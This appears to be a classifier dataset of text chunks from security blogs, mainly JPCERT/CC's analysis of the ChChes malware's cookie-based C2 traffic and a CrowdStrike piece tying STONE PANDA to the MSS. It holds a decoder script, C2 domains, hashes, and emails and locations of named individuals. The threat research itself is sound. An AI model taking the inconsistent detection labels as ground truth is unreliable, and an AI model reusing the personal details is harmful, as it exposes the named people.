        "text": "I cookie funzionali ci aiutano a tenere traccia delle tue scelte di navigazione precedenti, in modo da\nmigliorare la facilit\u00e0 di utilizzo e personalizzare la User Experience. Questi cookie consentono al sito\ndi ricordare le tue impostazioni preferite, la tua posizione e altri elementi personalizzabili, come\ncarattere o dimensioni del testo. Se non accetti questi cookie, alcuni servizi potrebbero non\nfunzionare correttamente.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.2702859938144684
        },
        "prediction": {}
    },
    {
        "text": "cookie\u200ePubblicitari  Pubblicitari I cookie pubblicitari permettono di inviare informazioni rilevanti su pubblicit\u00e0 e promozioni. Possono\nessere impostati sul nostro sito da soggetti terzi per creare un profilo dei tuoi interessi e mostrarti\npubblicit\u00e0 rilevanti su altri siti. Questi cookie non conservano direttamente le informazioni personali\ndell'utente, in quanto servono esclusivamente a identificare il tuo browser e il dispositivo connesso a\nInternet. Dettagli dei cookie\u200eBack ButtonElenco dei cookie Filter ButtonConsent Leg. Interest checkbox label label checkbox label label checkbox label labelClear checkbox label labelApply CancelConferma le mie scelteRifiuta tutti Consenti tuttiLa tua privacy",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.2767733037471771
        },
        "prediction": {}
    },
    {
        "text": "\n\n  \nChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT/CC Eyes | JPCERT Coordination Center official Blog\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n      \n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\nJPCERT/CC Eyes\n\nJPCERT Coordination Center official Blog\n\nLanguage:\n\n\n\u65e5\u672c\u8a9e\nEnglish\n\n\n\n\n\n\n\nTop\u00a0>\u00a0List of \u201cMalware\u201d\u00a0>\u00a0ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers\n      \n\n\n\n\n\n\n\n\n\n\n\n\nJPCERT/CC\n\n\nFebruary 15, 2017\n\n\nChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers\n\n\n\nChChes\n\n\n\n\n\n\n\n\n\nEmail\n\n\n\n\nSince around October 2016, JPCERT/CC has been confirming emails that are sent to Japanese organisations with a ZIP file attachment containing executable files.",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.4033941924571991
        },
        "prediction": {}
    },
    {
        "text": "The targeted emails, which impersonate existing persons, are sent from free email address services available in Japan. Also, the executable files\u2019 icons are disguised as Word documents. When the recipient executes the file, the machine is infected with malware called ChChes.\n",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6563495993614197
        },
        "prediction": {}
    },
    {
        "text": "ZIP files attached to Targeted Emails\nWhile some ZIP files attached to the targeted emails in this campaign contain executable files only, in some cases they also contain dummy Word documents.",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6351936459541321
        },
        "prediction": {}
    },
    {
        "text": "Below is the example of the latter case.\n Figure 1: Example of an attached ZIP file\n\n\n\n\n\n\nIn the above example, two files with similar names are listed: a dummy Word document and an executable file whose icon is disguised as a Word document. By running this executable file, the\u00a0machine will be infected with ChChes. JPCERT/CC has confirmed the executable files that have signatures of a specific code signing certificate. The dummy Word document is harmless, and its contents are existing online articles related to the file name \u201cWhy Donald Trump won\u201d.",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.47279125452041626
        },
        "prediction": {}
    },
    {
        "text": "The details of the code signing certificate is described in Appendix A.\nCommunication of ChChes\nChChes is a type of malware that communicates with specific sites using HTTP to receive commands and modules.",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6747530698776245
        },
        "prediction": {}
    },
    {
        "text": "This means it expands its functions by receiving modules from C&C servers and loading them on the memory.\n",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6736026406288147
        },
        "prediction": {}
    },
    {
        "text": "HTTP/1.1\nCookie: uHa5=kXFGd3JqQHMfnMbi9mFZAJHCGja0ZLs%3D;KQ=yt%2Fe(omitted)\nAccept: */*\nAccept-Encoding: gzip, deflate\nUser-Agent: [user agent]\nHost: [host name]\nConnection: Keep-Alive\nCache-Control: no-cache\n\nAs you can see, the path for HTTP request takes /[random string].htm, however, the value for the Cookie field is not random but encrypted strings corresponding to actual data used in the communication with C&C servers.",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.47325921058654785
        },
        "prediction": {}
    },
    {
        "text": "[]\nfor i in range(len(data_list)):\n    tmp = data_list[i]\n    pos = tmp.find(\"=\")\n    key = tmp[0:pos]\n    val = tmp[pos:]\n    md5 = hashlib.md5()\n    md5.update(key)\n    rc4key = md5.hexdigest()[8:24]\n    rc4 = ARC4.new(rc4key)\n     dec.append(rc4.decrypt(val.decode(\"base64\"))[len(key):])\nprint(\"[*] decoded: \" + \"\".join(dec))\n\n",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.28359779715538025
        },
        "prediction": {}
    },
    {
        "text": "The value in the Cookie field of the HTTP request that ChChes first sends (Request 1) contains encrypted data starting with \u2018A\u2019.",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.7304426431655884
        },
        "prediction": {}
    },
    {
        "text": "The following is an example of data sent.\n Figure 3: Example of the first data sent\n\n\n\n\n\n\nAs indicated in Figure 3, the data which is sent contains information including computer name. The format of the encrypted data differs depending on ChChes\u2019s version. The details are specified in Appendix B.\nAs a response to Request 1, ChChes receives strings of an ID identifying the infected\u00a0machine from C&C servers (Response 1). The ID is contained in the Set-Cookie field as shown below.\n",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5670487284660339
        },
        "prediction": {}
    },
    {
        "text": "Figure 4: Example response to the first request\n\n\n\n\n\n\nRequest for Modules and Commands\nNext, ChChes sends an HTTP request to receive modules and commands (Request 2).",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6232424974441528
        },
        "prediction": {}
    },
    {
        "text": "At this point, the following data starting with \u2018B\u2019 is encrypted and contained in the Cookie field.\n B[ID to identify the infected machine]\n\nAs a response to Request 2, encrypted modules and commands (Response 2) are sent from C&C servers. The following shows an example of received modules and commands after decryption.\n Figure 5: Decrypted data of modules and commands received\n\n\n\n\n\n\nCommands are sent either together with modules as a single data (as above), or by itself. Afterwards, execution results of the received command are sent to C&C servers, and it returns to the process to receive modules and commands.",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.42049458622932434
        },
        "prediction": {}
    },
    {
        "text": "This way, by repeatedly receiving commands from C&C servers, the infected\u00a0machines will be controlled remotely.\n JPCERT/CC\u2019s research has confirmed modules with the following functions, which are thought to be the bot function of ChChes.\n\n",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6598950624465942
        },
        "prediction": {}
    },
    {
        "text": "Encrypt communication using AES\nExecute shell commands\nUpload files\nDownload files\nLoad and run DLLs\nView tasks of bot commands\n\n",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6055596470832825
        },
        "prediction": {}
    },
    {
        "text": "Especially, it was confirmed that the module that encrypts the communication with AES is received in a relatively early stage after the infection. With this feature, communication with C&C servers after this point will be encrypted in AES on top of the existing encryption method.\n Summary\nChChes is a relatively new kind of malware which has been seen since around October 2016. As this may be continually used for targeted attacks, JPCERT/CC will keep an eye on ChChes and attack activities using the malware.\n The hash values of the samples demonstrated here are described in Appendix C. The malware\u2019s destination hosts that JPCERT/CC has confirmed are listed in Appendix D. We recommend that you check if your\u00a0machines are communicating with such hosts.\n",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.386854350566864
        },
        "prediction": {}
    },
    {
        "text": "- Yu Nakamura\n(Translated by Yukako Uchida)\n\nAppendix A: Code signing certificate\nThe code signing certificate attached to some samples are the following:\n$ openssl x509 -inform der -text -in mal.cer \nCertificate:\n    Data:\n        Version: 3 (0x2)\n        Serial Number:\n            3f:fc:eb:a8:3f:e0:0f:ef:97:f6:3c:d9:2e:77:eb:b9\n    Signature Algorithm: sha1WithRSAEncryption\n        Issuer: C=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=Terms of use at https://www.verisign.com/rpa (c)10, CN=VeriSign Class 3 Code Signing 2010 CA\n        Validity\n            Not Before: Aug  5 00:00:00 2011 GMT\n            Not After : Aug  4 23:59:59 2012 GMT\n        Subject: C=IT, ST=Italy, L=Milan, O=HT Srl, OU=Digital ID Class 3 - Microsoft Software Validation v2, CN=HT Srl\n        Subject Public Key Info:\n(Omitted)\n\nFigure 6: Code signing certificate\n\n\n\n\n\n\nAppendix B: ChChes version\nThe graph below shows the relation between the version numbers of the ChChes samples that JPCERT/CC has confirmed and the compile times obtained from their PE headers.\n Figure 7: Compile time for each ChChes version\n\n\n\n\n\n\nThe lists below describe encrypted data contained in the first HTTP request and explanation of the values for each ChChes version.\n",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.10986188799142838
        },
        "prediction": {}
    },
    {
        "text": "Table 1: Sending format of each version\n\n\nVersion\nFormat\n\n\n\n\n1.0.0\nA<a>*<b>?3618468394?<c>?<d>*<f>\n\n\n1.2.2\nA<a>*<b>?3618468394?<c>?<d>*<f>\n\n\n1.3.0\nA<a>*<b>?3618468394?<c>?<d>*<f>\n\n\n1.3.2\nA<a>*<b>?3618468394?<c>?<d>*<g>\n\n\n 1.4.0\n A<a>*<b>?3618468394?<c>?<d>*<g>\n\n\n1.4.1\nA<a>*<b>?3618468394?<c>?<d> (<e>)*<g>\n\n\n1.6.4\nA<a>*<b>*<h>?3618468394?<c>?<d> (<e>)*<g>\n\n\n\n\nTable 2: Description of <a> to <h>\n\n\nLetter\nData\nSize\nDetails\n\n\n\n\n<a>\nComputer name\nVariable\nCapital alphanumeric characters\n\n\n<b>\nProcess ID\nVariable\nCapital alphanumeric characters\n\n\n<c>\nPath of a temp folder\nVariable\n%TEMP% value\n\n\n<d>\nMalware version\nVariable\ne.g. 1.4.1\n\n\n<e>\n Screen resolution\nVariable\ne.g. 1024x768\n\n\n<f>\nexplorer.exe version\nVariable\ne.g. 6.1.7601.17567\n\n\n<g>\nkernel32.dll version\nVariable\ne.g. 6.1.7601.17514\n\n\n<h>\nPart of MD5 value of SID\n16 bytes\ne.g. 0345cb0454ab14d7\n\n\n\nAppendix C: SHA-256 Hash value of the samples\nChChes\n\n5961861d2b9f50d05055814e6bfd1c6291b30719f8a4d02d4cf80c2e87753fa1\nae6b45a92384f6e43672e617c53a44225e2944d66c1ffb074694526386074145\n2c71eb5c781daa43047fa6e3d85d51a061aa1dfa41feb338e0d4139a6dfd6910\n19aa5019f3c00211182b2a80dd9675721dac7cfb31d174436d3b8ec9f97d898b\n316e89d866d5c710530c2103f183d86c31e9a90d55e2ebc2dda94f112f3bdb6d\nefa0b414a831cbf724d1c67808b7483dec22a981ae670947793d114048f88057\ne90064884190b14a6621c18d1f9719a37b9e5f98506e28ff0636438e3282098b\n9a6692690c03ec33c758cb5648be1ed886ff039e6b72f1c43b23fbd9c342ce8c\nbc2f07066c624663b0a6f71cb965009d4d9b480213de51809cdc454ca55f1a91\ne6ecb146f469d243945ad8a5451ba1129c5b190f7d50c64580dbad4b8246f88e\ne88f5bf4be37e0dc90ba1a06a2d47faaeea9047fec07c17c2a76f9f7ab98acf0\nd26dae0d8e5c23ec35e8b9cf126cded45b8096fc07560ad1c06585357921eeed\n2965c1b6ab9d1601752cb4aa26d64a444b0a535b1a190a70d5ce935be3f91699\n312dc69dd6ea16842d6e58cd7fd98ba4d28eefeb4fd4c4d198fac4eee76f93c3\n4ff6a97d06e2e843755be8697f3324be36e1ebeb280bb45724962ce4b6710297\n45d804f35266b26bf63e3d616715fc593931e33aa07feba5ad6875609692efa2\ncb0c8681a407a76f8c0fd2512197aafad8120aa62e5c871c29d1fd2a102bc628\n75ef6ea0265d2629c920a6a1c0d1dd91d3c0eda86445c7d67ebb9b30e35a2a9f\n471b7edbd3b344d3e9f18fe61535de6077ea9fd8aa694221529a2ff86b06e856\nae0dd5df608f581bbc075a88c48eedeb7ac566ff750e0a1baa7718379941db86\n646f837a9a5efbbdde474411bb48977bff37abfefaa4d04f9fb2a05a23c6d543\n3d5e3648653d74e2274bb531d1724a03c2c9941fdf14b8881143f0e34fe50f03\n9fbd69da93fbe0e8f57df3161db0b932d01b6593da86222fabef2be31899156d\n723983883fc336cb575875e4e3ff0f19bcf05a2250a44fb7c2395e564ad35d48\nf45b183ef9404166173185b75f2f49f26b2e44b8b81c7caf6b1fc430f373b50b\n\nAppendix D: List of communication destination\n\narea.wthelpdesk.com\ndick.ccfchrist.com\nkawasaki.cloud-maste.com\nkawasaki.unhamj.com\nsakai.unhamj.com\nscorpion.poulsenv.com\ntrout.belowto.com\nzebra.wthelpdesk.com\nhamiltion.catholicmmb.com\ngavin.ccfchrist.com\n\n\n\n\n\n\n\n\nEmail\n\n\n\n\n\nAuthor\n\n\n\n\n\n\nJPCERT/CC\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPlease use the below contact form for any inquiries about the article.\n\n\n\n\n\n\n\n\n\n\n",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.18506455421447754
        },
        "prediction": {}
    },
    {
        "text": "If you wish to make comments or ask questions, please use this form.\n\n This form is for comments and inquiries.",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5061925649642944
        },
        "prediction": {}
    },
    {
        "text": "Related articles\n\n\n\n\n\n\n\nMalDoc in PDF - Detection bypass by embedding a malicious Word file into a PDF file \u2013\n\n\n\n\n\n\n\n\n\nYAMA-Yet Another Memory Analyzer for malware detection\n\n\n\n\n\n\n\n\n\n DangerousPassword attacks targeting developers\u2019 Windows, macOS, and Linux environments\n\n\n\n\n\n\n\n\n\nHow to Create F.L.I.R.T Signature Using Yara Rules for Static Analysis of ELF Malware\n\n\n\n\n\n\n\n\n\nGobRAT malware written in Go language targeting Linux routers\n\n\n\n\n\n\n\n\nBack\n\n\nTop\n\n\nNext\n\n\n\n\n\n\n\n\n\u00d7\u691c\u7d22\u00a0\u30ab\u30b9\u30bf\u30e0\u691c\u7d22 \u8868\u793a\u9806:RelevanceRelevanceDate\n\n\n\nCategories\n\n\nMalware\n\n\nIncident\n\n\nEvent\n\n\nVulnerability\n\n\nSecurity Technology\n\n\nForensic\n\n\nCyber Metrics\n\n\nICS-OT\n\n\nOther\n\n\n\n\n\n\nTags\n\n\nPython\n\n\nConference\n\n\nDatper\n\n\nChChes\n\n\nTraining\n\n\nStatistics and Indicator\n\n\nTool\n\n\nBlackTech\n\n\nLogonTracer\n\n\nReport\n\n\nSplunk\n\n\nElasticStack\n\n\nimpfuzzy\n\n\nvolatility\n\n\nRedLeaves\n\n\nPlugX\n\n\nDarkHotel\n\n\nBanking malware\n\n\nPacific_Islands\n\n\nCSIRT\n\n\nPassword\n\n\nPolicy\n\n\nDDoS\n\n\nAPT\n\n\nTrend\n\n\nAfrica\n\n\nSecureCoding\n\n\nSysmonSearch\n\n\nJSAC\n\n\nIoT\n\n\nIIoT\n\n\nQuasar\n\n\nLODEINFO\n\n\nLazarus\n\n\nEmotet\n\n\nPhishing\n\n\nMetrics\n\n\nTSUBAME\n\n\nStandard-Guideline\n\n\n\n\n      \n            \n      \n\n\n        \n  \n  \u3000\n\nRanking\n\n\n\n\n1\n\n\n\n\n\n\n\nMalDoc in PDF - Detection bypass by embedding a malicious Word file into a PDF file \u2013 \n\n\n\n\n\n\n2\n\n\n\n\n\n\n\nTSUBAME Report Overflow (Jul-Sep 2023) \n\n\n\n\n\n\n3\n\n\n\n\n\n\n\nHow to Use Volatility 3 Offline \n\n\n\n\n\n\n4\n\n\n\n\n\n\n\nWindows Commands Abused by Attackers \n\n\n\n\n\n\n5\n\n\n\n\n\n\n\nAnti-UPX Unpacking Technique \n\n\n\n\n\n\n\n\n\n\nAuthors\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nArchives\n\n202318\n202219\n202120\n202021\n201918\n201812\n201717\n201618\n201520\n201418\n20137\n20122\n20118\n20104\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nJPCERT/CC\n\n8F Tozan Bldg, 4-4-2 Nihonbashi-Honcho, Chuo-ku, Tokyo 1030023 JAPAN\nTEL: +81-3-6271-8901\u3000FAX: +81-3-6271-8908\n\n\n\n\n\nPrivacy Policy\nDisclaimer\n\n\n\n\u00a9 1996-2023 JPCERT/CC\n\n\n\n\n\n",
        "source": "ChChes \u2013 Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.15266108512878418
        },
        "prediction": {}
    },
    {
        "text": "The Windows Restart Manager: How It Works and How It Can Be Hijacked, Part 2\n\n09/01/2023\n\n\n\n\n  The Windows Restart Manager: How It Works and How It Can Be Hijacked, Part 1\n\n08/25/2023\n\n\n\n\n ",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5720565319061279
        },
        "prediction": {}
    },
    {
        "text": "The Windows Restart Manager: How It Works and How It Can Be Hijacked, Part 2\n\n09/01/2023\n\n\n\n\n  The Windows Restart Manager: How It Works and How It Can Be Hijacked, Part 1\n\n08/25/2023\n\n\n\n\n ",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5720565319061279
        },
        "prediction": {}
    },
    {
        "text": "Although the group\u2019s exact motives remain unclear, its initial tranche of information exposed individuals connected to long-running GOTHIC PANDA (APT3) operations, culminating in a connection to the Chinese firm Boyusec (\u535a\u5fa1\u4fe1\u606f) and, ultimately, Chinese Ministry of State Security (MSS) entities in Guangzhou.\n  Recently, in July and August 2018, IntrusionTruth has returned with new reporting regarding actors with ties to historic STONE PANDA (APT10) activity and has ultimately associated them with the MSS Tianjin Bureau (\u5929\u6d25\u5e02\u56fd\u5bb6\u5b89\u5168\u5c40).",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.3838162422180176
        },
        "prediction": {}
    },
    {
        "text": "Though CrowdStrike\u00ae Falcon Intelligence\u2122 is currently unable to confirm all of the details provided in these most recent posts with a high degree of confidence, several key pieces of information can be verified.\n\n  Several of the named individuals have been active registering domains as recently as June 2018, and they responded to the IntrusionTruth blog posts by scrubbing their social media or by following IntrusionTruth\u2019s Twitter account.\n  Named individuals ZHANG Shilong and GAO Qiang have significant connections to known Chinese hacking forums, and they have sourced tools currently in use by China-based cyber adversaries. \n ",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.40403345227241516
        },
        "prediction": {}
    },
    {
        "text": "ZHANG has registered several sites with overlapping registrant details that show both his affiliation with several physical technology firm addresses as well as his residence in Tianjin. \n",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5341164469718933
        },
        "prediction": {}
    },
    {
        "text": "Named firm Huaying Haitai has been connected to a Chinese Ministry of Industry and Information Technology (MIIT) sponsored attack and defense competition; this is similar to GOTHIC PANDA\u2019s ties to an active defense lab sponsored by China Information Technology Evaluation Center (CNITSEC).\n",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5704829692840576
        },
        "prediction": {}
    },
    {
        "text": "Huaying Haitai has previously hired Chinese students with Japanese language skills; this is significant, as STONE PANDA has engaged in several campaigns targeting Japanese firms. \n ",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.48146459460258484
        },
        "prediction": {}
    },
    {
        "text": "The MSS Tianjin Bureau is confirmed to be located at the described address, not far from many of the registrant addresses listed by ZHANG as well the firms GAO was likely recruiting for. \n\n ",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.6849164962768555
        },
        "prediction": {}
    },
    {
        "text": "More details that may further illuminate these findings and provide a higher confidence in connecting STONE PANDA to the MSS Tianjin Bureau are likely to emerge.\n ",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.6646735072135925
        },
        "prediction": {}
    },
    {
        "text": "Background\nThroughout May 2017, using a variety of historical information and open-source intelligence (OSINT), IntrusionTruth released several blog posts identifying several individuals connected to Boyusec. Though CrowdStrike\u2019s Threat Intelligence team had suspected GOTHIC PANDA was an MSS contractor for several years, the IntrusionTruth posts and subsequent research by RecordedFuture into MSS ties to the China Information Technology Evaluation Center (CNITSEC/\u4e2d\u56fd\u4fe1\u606f\u5b89\u5168\u6d4b\u8bc4\u4e2d\u5fc3) corroborated additional details from various sources and provided a higher degree of confidence. Confidence in these findings was further boosted when the U.S. Department of Justice named Boyusec and several of the described individuals in an indictment, and detailed GOTHIC PANDA tactics, techniques, and procedures (TTPs) in detail.\n ",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.342217355966568
        },
        "prediction": {}
    },
    {
        "text": "CrowdStrike Falcon\u00ae Intelligence was able to independently verify the majority of this information and concluded that not only is CNITSEC associated with the MSS, but its former director WU Shizhong (\u5434\u4e16\u5fe0) was simultaneously dual-hatted as the director of the MSS Technology/13th Bureau (\u56fd\u5bb6\u5b89\u5168\u90e8\u79d1\u6280\u5c40\u5c40\u957f)1 2 3,  implying that the MSS plays a crucial role in China\u2019s code review of foreign products and is now able to cherry pick high-value vulnerabilities from its own capable domestic bug hunting teams. CNITSEC\u2019s role in code review for foreign entities has led to its access to Microsoft\u2019s source code dating back to 2003 and the use by KRYPTONITE PANDA of a high-value vulnerability (CVE-2018-0802), discovered by Chinese firm Qihoo 360, a month before it was publicly revealed.\n ",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.33492153882980347
        },
        "prediction": {}
    },
    {
        "text": "WU Shizhong Presenting on the \u201cDigital Silk Road\u201d at the Second Wuzhen World Internet Conference in 2015\n ",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.7295385599136353
        },
        "prediction": {}
    },
    {
        "text": "As research into the IntrusionTruth leads on STONE PANDA continues, Falcon Intelligence has already observed some consistencies with known MSS operations.\n ",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.6709703207015991
        },
        "prediction": {}
    },
    {
        "text": "Sinking Like a STONE \u00a0\u00a0\nGAO Qiang (\u9ad8/\u90dc \u5f3a)\nMany of the personal details for GAO were scrubbed shortly after IntrusionTruth\u2019s post introducing him went live, including his Tencent QQ account.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.6365212798118591
        },
        "prediction": {}
    },
    {
        "text": "The blog connects him to the moniker fisherxp via an initial spear-phishing campaign from 2010 previously attributed to STONE PANDA.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.7330633997917175
        },
        "prediction": {}
    },
    {
        "text": "Multiple sites with profile pictures appear to show the owner of the fisherxp accounts, though this has yet to be independently confirmed as GAO.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.692707359790802
        },
        "prediction": {}
    },
    {
        "text": "Fisherxp\u2019s QQ shows his alternate username as \u80a5\u732a or \u201cbig porker\u201d. IntrusionTruth later links GAO to several documented Uber rides to the MSS Tianjin Bureau\u2019s office address where both his first name, Qiang/\u5f3a, and \u732a are used by the app to identify him and tie him to the QQ number 420192. CrowdStrike cannot confirm the validity of these Uber receipts at this time.\n",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5680316686630249
        },
        "prediction": {}
    },
    {
        "text": "However, fisherxp\u2019s account on popular Chinese technology forum 51CTO is still active and shows that he has downloaded not only the open-source DarkComet RAT and numerous password cracking tools, but more importantly, several favorite tools used by a plethora of known Chinese cyber adversaries including Gh0st RAT 3.6, zxarps (an ARP-spoofing tool by legacy hacker LZX), and lcx.exe (a port-forwarding tool by legacy hacker LCX)4.\n ZHANG Shilong (\u5f20\u4e16\u9f99)\nZHANG was originally introduced by IntrusionTruth as a reciprocal follower of fisherxp\u2019s Twitter account via his own @baobeilong account. Baobeilong (\u5b9d\u8d1d\u9f99/\u201dBaby Dragon\u201d) also maintained a GitHub account that had forked both the Quasar and Trochilus RATs, two open-source tools historically used by STONE PANDA, but the account has since been scrubbed.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.36835572123527527
        },
        "prediction": {}
    },
    {
        "text": "This information was verified by CrowdStrike before being removed completely. Falcon Intelligence recently independently conducted detailed analysis of the RedLeaves malware used to target numerous Japanese defense groups and found it was directly sourced from Trochilus code, but it has undergone several evolutions and contains prefixes suggesting it could also be used to target Russia and the DPRK. There is no conclusive evidence at this time that RedLeaves is solely attributed to STONE PANDA. \n",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5128536820411682
        },
        "prediction": {}
    },
    {
        "text": "Baobeilong did maintain a Flickr account with numerous pictures that proved key in identifying his location later, similar to how cpyy\u2019s photos helped identify his affiliation to the People\u2019s Liberation Army (PLA) in CrowdStrike\u2019s PUTTER PANDA report.\n  IntrusionTruth then drew connections from baobeilong\u2019s other online accounts to registrant details for xiaohong[.]org, which dated back to 2007 and revealed ZHANG\u2019s full name\u2014ZHANG Shilong.",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": true,
            "confidence": 0.5521993041038513
        },
        "prediction": {}
    },
    {
        "text": "From there, a trail of overlapping registrant details reveals ZHANG\u2019s hanzi characters for his name (\u5f20\u4e16\u9f99), likely one of his personal home addresses, potential work addresses and several email addresses:\n\nlong@xiaohong[.]org\nbaobei@xiaohong[.]org\natreexp@yahoo[.]com.cn \nrobin4700@foxmail[.]com\neshilong@vip.qq[.]com \u00a0\u00a0\n\nSpecifically tracing registrant details from atreexp \u2192 robin4700 \u2192 eshilong shows that ZHANG was active registering sites as recently as June 5, 2018, including a personal blog where his picture and name features prominently along with several technology-related blog posts. \u00a0\n  A picture from baobeilong\u2019s Flickr account shows a fire at the Tianjin Medical Center 120\nLaoying Baichen Instruments\nThe original blog post on GAO lists his contact information in recruitment postings for two separate companies, one of which is Laoying Baichen Instruments (characters unknown at the time of this writing).",
        "source": "Two Birds, One STONE PANDA.html",
        "detection": {
            "response": false,
            "confidence": 0.3132399916648865
        },
        "prediction": {}
    },
    {
